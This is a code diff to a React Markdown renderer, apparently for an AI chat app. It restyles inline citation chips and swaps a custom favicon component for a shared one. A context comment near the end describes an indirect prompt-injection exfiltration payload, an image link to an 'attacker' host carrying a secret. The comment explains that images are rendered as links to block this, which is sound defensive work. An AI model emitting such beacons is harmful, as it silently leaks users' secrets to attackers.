@@ -7,7 +7,6 @@ import {
   isValidElement,
   memo,
   useMemo,
-  useState,
 } from "react";
 import ReactMarkdown, { type Components } from "react-markdown";
 import rehypeHighlight from "rehype-highlight";
@@ -17,10 +16,14 @@ import remarkMath from "remark-math";
 import { CodeBlock, nodeText } from "./CodeBlock";
 import { DiagramBlock } from "./Diagram";
 import { EvidenceBadge } from "./EvidenceBadge";
-import { faviconUrl } from "./Favicon";
+import { Favicon } from "./Favicon";
 import { SourceTooltip } from "./SourcePreview";
 import { rehypeCodeMeta } from "./rehypeCodeMeta";
 import { splitMarkdownBlocks } from "./streamingMarkdown";
+
+/** Inline cite marker: muted pill with favicon (letter fallback) + number. */
+const CITE_CHIP_CLASS =
+  "mx-0.5 inline-flex h-4 items-center gap-0.5 rounded-full bg-muted px-1 align-middle text-xs font-medium tabular-nums leading-none text-muted-foreground no-underline hover:bg-accent hover:text-foreground";
 
 function ledgerEntryAsCitation(
   entry: TurnEvidenceLedgerEntry,
@@ -96,27 +99,6 @@ const MarkdownChunk = memo(function MarkdownChunk({
 });
 
 /**
- * A tiny inline favicon for a citation chip. Unlike the card {@link Favicon}, it
- * has NO letter fallback: a missing host or a failed load (common for sites with
- * cert issues) renders nothing, so the chip cleanly degrades to a number-only pill
- * mid-sentence instead of an awkward letter glyph in the reading flow.
- */
-function ChipFavicon({ site }: { site?: string }) {
-  const domain = site?.trim();
-  const [failed, setFailed] = useState(false);
-  if (!domain || failed) return null;
-  return (
-    <img
-      src={faviconUrl(domain)}
-      alt=""
-      loading="lazy"
-      onError={() => setFailed(true)}
-      className="size-3 shrink-0 rounded-full object-contain"
-    />
-  );
-}
-
-/**
  * Resolve a `#rN` chip target: prefer ``citations[].id`` (P2 引用集), else fall
  * back to the turn evidence ledger entry (same URL / meta). Mid-turn ledger can
  * arrive before ``citations_event``; without this fallback the remark rewrite
@@ -157,8 +139,8 @@ function resolveLedgerCitation(
 }
 
 /**
- * Inline citation marker: display number + optional favicon, linked to the real
- * source URL (system browser via target=_blank). Hover reuses SourceTooltip.
+ * Inline citation marker: muted favicon+number pill, linked to the real source
+ * URL (system browser via target=_blank). Hover reuses SourceTooltip.
  * Props arrive from remark's `citemark` via `data.hProperties` (`data-n`).
  */
 function CitationChip({
@@ -190,9 +172,14 @@ function CitationChip({
         target="_blank"
         rel="noreferrer"
         aria-label={`来源 ${display}（${dataLedgerId}）`}
-        className="mx-0.5 inline-flex h-auto items-center gap-0.5 rounded-full bg-primary/10 px-1.5 align-middle text-xs font-medium leading-none text-primary no-underline hover:bg-primary/20"
+        className={CITE_CHIP_CLASS}
       >
-        <ChipFavicon site={citation.site} />
+        <Favicon
+          site={citation.site}
+          title={citation.title}
+          size={12}
+          className="bg-background"
+        />
         {display}
       </a>
     );
@@ -218,9 +205,14 @@ function CitationChip({
       target="_blank"
       rel="noreferrer"
       aria-label={`来源 ${display}`}
-      className="mx-0.5 inline-flex h-auto items-center gap-0.5 rounded-full bg-primary/10 px-1.5 align-middle text-xs font-medium leading-none text-primary no-underline hover:bg-primary/20"
+      className={CITE_CHIP_CLASS}
     >
-      <ChipFavicon site={citation.site} />
+      <Favicon
+        site={citation.site}
+        title={citation.title}
+        size={12}
+        className="bg-background"
+      />
       {display}
     </a>
   );
@@ -345,8 +337,8 @@ export const Markdown = memo(function Markdown({
     // Without it, an indirect-injection payload like `![](http://attacker/?d=<secret>)`
     // would fetch on render = a no-click, silent exfil beacon for anything the model was
     // induced to encode in the URL. As a link, egress needs an explicit user click (the
-    // same bar as any model-emitted link). Citation favicons go through <Favicon> /
-    // <ChipFavicon> (backend proxy, a separate trusted path), so they're unaffected.
+    // same bar as any model-emitted link). Citation favicons go through <Favicon>
+    // (backend proxy, a separate trusted path), so they're unaffected.
     const img = ({ src, alt }: ComponentPropsWithoutRef<"img">) => {
       const href = typeof src === "string" ? src : undefined;
       const label =
